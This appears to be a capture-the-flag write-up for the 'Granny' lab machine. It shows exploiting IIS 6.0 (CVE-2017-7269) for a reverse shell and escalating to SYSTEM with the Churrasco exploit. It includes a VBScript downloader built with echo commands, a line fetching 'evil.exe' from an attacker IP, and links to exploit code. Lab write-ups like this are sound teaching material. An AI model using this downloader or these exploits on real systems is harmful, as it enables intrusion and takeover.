# Granny

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (1266).png" alt=""><figcaption></figcaption></figure>

### IIS 6.0

This machine is running an outdated version of Microsoft IIS, which is vulnerable to a RCE exploit.

{% embed url="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell" %}

Using this, we can gain a reverse shell easily:

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1282).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Churrasco

We can enumerate the machine using `systeminfo`.

<figure><img src="../../../.gitbook/assets/image (823).png" alt=""><figcaption></figcaption></figure>

This is a really old version of Windows that is outdated and vulnerable to loads of exploits. One exploit is the Churrasco exploit, which works on Windows Server 2003 machines. However, because this machine was so old, it was hard to transfer files over to it using conventional Windows methods.&#x20;

So, we would need to create a `wget` binaruy using vbs.&#x20;

```powershell
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
# Afterwards, you can run this.
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
```

Afterwards, we can download the binary from here:

{% embed url="https://github.com/Re4son/Churrasco/raw/master/churrasco.exe" %}

The exploit works through impersonating the SYSTEM user to execute commands by stealing the tokens from the worker processes run by the SYSTEM user.&#x20;

The exploit can be used to gain a reverse shell easily via `nc.exe`:

<figure><img src="../../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

A listener port would have a shell as SYSTEM after execution.
